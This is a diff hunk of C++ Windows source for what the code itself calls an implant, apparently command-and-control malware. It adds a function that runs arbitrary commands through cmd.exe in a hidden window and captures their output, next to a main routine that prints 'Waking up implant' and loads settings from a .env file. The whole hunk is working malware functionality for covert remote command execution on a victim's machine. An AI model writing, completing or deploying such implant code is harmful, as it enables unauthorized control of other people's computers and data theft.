@@ -30,6 +30,66 @@ uint64_t parseTaskID(const std::string& hexStr) {
     catch (...) { return 0; }
 }
 
+std::string executeShellCommand(const std::string& command){
+    //logic for command execution goes here.
+    std::string result = "";
+    HANDLE hReadPipe = NULL;
+    HANDLE hWritePipe = NULL;
+
+    SECURITY_ATTRIBUTES sa;
+    sa.nLength = sizeof(SECURITY_ATTRIBUTES);
+    sa.bInheritHandle = TRUE;
+    sa.lpSecurityDescriptor = NULL;
+
+    if(!CreatePipe(&hReadPipe, &hWritePipe, &sa, 0)){
+        return "[-] Failed to create pipe!!";
+    }
+
+    STARTUPINFOA si;
+    ZeroMemory(&si, sizeof(si));
+    si.cb = sizeof(si);
+    si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
+    si.wShowWindow = SW_HIDE;
+    si.hStdOutput = hWritePipe;
+    si.hStdError = hWritePipe;
+
+
+    PROCESS_INFORMATION pi;
+    ZeroMemory(&pi, sizeof(pi));
+
+    std::string full_command = "cmd.exe /c" + command;
+    // 5. Spawn the Process
+    if(!CreateProcessA(NULL,
+            (LPSTR)full_command.c_str(),
+            NULL,
+            NULL,
+            TRUE,
+            CREATE_NO_WINDOW,
+            NULL,
+            NULL,
+            &si,
+            &pi
+    )) {
+        return "[-] CreateProcessA failed!";
+    }
+
+
+    CloseHandle(hWritePipe);
+    char buffer[4096];
+    DWORD bytesRead;
+    while(ReadFile(hReadPipe, buffer, sizeof(buffer) -1, &bytesRead, NULL) && bytesRead > 0) {
+        buffer[bytesRead] = '\0';
+        result += buffer;
+    }
+    // 8. Clean up
+    CloseHandle(hReadPipe);
+    CloseHandle(pi.hProcess);
+    CloseHandle(pi.hThread);
+
+    return result;
+
+}
+
 int main() {
     std::cout << "[*] Waking up implant. Loading from .env..." << std::endl;
 
